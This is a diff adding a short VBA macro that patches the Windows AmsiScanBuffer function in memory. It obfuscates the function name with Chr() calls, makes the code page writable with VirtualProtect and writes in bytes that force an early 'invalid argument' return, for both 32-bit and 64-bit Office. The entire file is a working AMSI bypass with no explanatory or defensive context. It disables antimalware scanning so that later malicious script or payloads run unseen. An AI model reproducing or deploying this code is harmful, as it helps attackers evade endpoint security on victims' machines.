@@ -1,0 +1,43 @@
+Sub dop()
+
+    Dim dllAddr As LongPtr
+    Dim AscBufAddr As LongPtr
+    Dim result As Long
+    Dim ArrayPointer As LongPtr
+
+
+    #If Win64 Then
+        Dim MyByteArray(6) As Byte
+        MyByteArray(0) = 184 
+        MyByteArray(1) = 87  
+        MyByteArray(2) = 0   
+        MyByteArray(3) = 7   
+        MyByteArray(4) = 128 
+        MyByteArray(5) = 195 
+    #Else
+        Dim MyByteArray(8) As Byte
+        MyByteArray(0) = 184 
+        MyByteArray(1) = 87  
+        MyByteArray(2) = 0   
+        MyByteArray(3) = 7   
+        MyByteArray(4) = 128 
+        MyByteArray(5) = 194 
+        MyByteArray(6) = 24  
+        MyByteArray(7) = 0 
+    #End If
+    
+
+    dllAddr = LoadLibrary("amsi.dll")
+    AscBufAddr = GetProcAddress(dllAddr, "A" & Chr(109) & Chr(115) & "i" & Chr(83) & "ca" & Chr(110) &  "B" & "uffer")
+    
+    #If Win64 Then
+        result = VirtualProtect(ByVal AscBufAddr, 6, 64, 0)
+        ArrayPointer = VarPtr(MyByteArray(0))
+        CopyMem ByVal AscBufAddr, ByVal ArrayPointer, 6
+    #Else
+        result = VirtualProtect(ByVal AscBufAddr, 8, 64, 0)
+        ArrayPointer = VarPtr(MyByteArray(0))
+        CopyMem ByVal AscBufAddr, ByVal ArrayPointer, 8
+    #End If
+
+End Sub
